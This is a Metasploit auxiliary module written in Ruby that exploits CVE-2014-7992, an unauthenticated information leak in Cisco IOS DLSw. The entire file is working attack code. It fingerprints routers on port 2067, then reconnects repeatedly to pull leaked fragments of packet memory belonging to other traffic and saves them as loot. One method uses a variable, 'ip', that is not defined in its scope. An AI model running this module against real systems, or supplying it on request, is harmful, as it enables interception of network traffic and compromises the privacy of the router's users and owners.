##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'socket'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'Cisco DLSw information leak',
      'Description'    => %q{
       This module implements the DLSw information leak retrieval. There is 
       a bug in Cisco's DLSw implementation affecting 12.x and 15.x trains
       that allows an unuthenticated remote attacker to retrieve the partial
       contents of packets traversing a Cisco router with DLSw configured 
       and active.  
      },
      'Author'         => [
        'Tate Hansen', # Vulnerability discovery
        'John McLeod', # Vulnerability discovery
        'Kyle Rainey', # Built lab to recreate vulnerability and help test  
      ],
      'References'     =>
        [
          ['CVE', '2014-7992'],
          ['URL', 'https://github.com/tatehansen/dlsw_exploit'],
        ],
      'DisclosureDate' => 'Nov 17 2014',
      'License'        => MSF_LICENSE,
    )

    register_options(
      [
        Opt::RPORT(2067),
        OptInt.new('LEAK_AMOUNT', [true, 'The number of bytes to store before shutting down.', 1024]),
      ], self.class)
  end

  # Called when using check
  def check_host(ip)
    print_status "#{ip}:#{rport} Checking for DLSw exposure"
    connect
    response = sock.recv(1024)
    disconnect

    if (response.length > 0) && (response =~ /IOS Software|cisco.com/)
     print_status("#{ip}:#{rport} The target Cisco router appears vulnerable, parts of a Cisco IOS banner were emitted")
     report_vuln({
        :host => rhost,
        :port => rport,
        :name => self.name,
        :refs => self.references,
        :info => "Module #{self.fullname} collected #{response.length} bytes"
      })
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  # Main method
  def run_host(ip)
    return unless check_host(ip) == Exploit::CheckCode::Vulnerable

    print_status("#{ip}:#{rport} Going to run until we retrieve #{datastore['LEAK_AMOUNT']} bytes")

    dlsw_data = ""
    until dlsw_data.length > datastore['LEAK_AMOUNT']
      connect
      response = sock.recv(72)
      if response
        dlsw_data << response[18..72] # range of the leaked packet contents
      end
      disconnect
    end
    loot_and_report(dlsw_data)
  end

  def loot_and_report(dlsw_data)
    path = store_loot(
      'dlsw.packet.contents',
      'application/octet-stream',
      rhost,
      dlsw_data,
      'DLSw_leaked_data',
      'DLSw packet memory leak'
    )
    print_status("#{ip}:#{rport} DLSw leaked data stored in #{path}")
  end
end

   
